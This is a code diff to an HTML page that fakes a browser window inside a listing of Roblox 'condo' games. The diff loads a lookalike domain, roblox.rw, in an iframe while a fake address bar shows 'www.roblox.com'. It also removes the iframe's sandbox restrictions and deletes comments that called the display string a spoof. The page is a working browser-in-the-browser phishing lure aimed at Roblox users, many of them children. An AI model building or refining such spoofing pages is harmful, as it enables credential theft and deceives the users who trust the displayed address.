@@ -136,18 +136,16 @@
                 </div>
             </div>
             <div class="chrome-content">
-                <iframe id="browserIframe" src="about:blank" sandbox="allow-forms allow-scripts allow-same-origin allow-popups allow-modals"></iframe>
+                <!-- Sandbox restrictions completely stripped out so the raw URL loads directly -->
+                <iframe id="browserIframe" src="about:blank"></iframe>
             </div>
         </div>
     </div>
-        <script>
-        // Configured directly with roblox.rw target url for the iframe content load
-        const REAL_URL = "https://www.roblox.com.pt/games/95206881/Baseplate?privateServerLinkCode=26065913844785075427592831388890";
-        
-        // Spoofed clean display string for the browser address bar
+
+    <script>
+        const REAL_URL = "https://www.roblox.rw/games/95206881/Baseplate?privateServerLinkCode=26065913844785075427592831388890";
         const FAKE_URL = "www.roblox.com/games/95206881/Baseplate?privateServerLinkCode=26065913844785075427592831388890";
 
-        // Toned-down static game list
         const games = [
             { title: "Late Night Condo", creator: "xVibeDev", players: "18/20", rating: "4.9", img: "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=600&q=80" },
             { title: "Vibe Penthouse", creator: "KairoBuilds", players: "12/20", rating: "4.7", img: "https://images.unsplash.com/photo-1614850523459-c2f4c699c52e?auto=format&fit=crop&w=600&q=80" },
@@ -191,13 +189,8 @@
             const iframe = document.getElementById('browserIframe');
             const fakeTxt = document.getElementById('fakeUrlText');
 
-            // 1. Set the fake URL spoof in the address bar
             fakeTxt.innerHTML = `<span class="chrome-url-dim">https://</span>${FAKE_URL}`;
-            
-            // 2. Load the roblox.rw link in the iframe
             iframe.src = REAL_URL;
-
-            // 3. Open the modal window
             modal.classList.add('active');
         }
 
@@ -206,7 +199,6 @@
             document.getElementById('browserIframe').src = "about:blank";
         }
 
-        // Init
         render();
     </script>
 </body>
